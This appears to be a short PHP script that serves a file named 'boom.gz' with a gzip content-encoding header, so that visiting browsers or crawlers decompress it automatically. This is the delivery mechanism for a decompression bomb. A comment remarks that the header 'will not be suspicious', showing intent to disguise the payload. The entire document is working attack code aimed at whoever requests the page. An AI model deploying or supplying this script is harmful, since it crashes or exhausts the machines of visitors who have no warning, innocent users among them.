<?php
//prepare the client to recieve GZIP data. This will not be suspicious
//since most web servers use GZIP by default
header("Content-Encoding: gzip");
header("Content-Length: ".filesize('./boom.gz'));
//Turn off output buffering
if (ob_get_level()) {
    ob_end_clean();
}
//send the gzipped file to the client
readfile('./boom.gz');
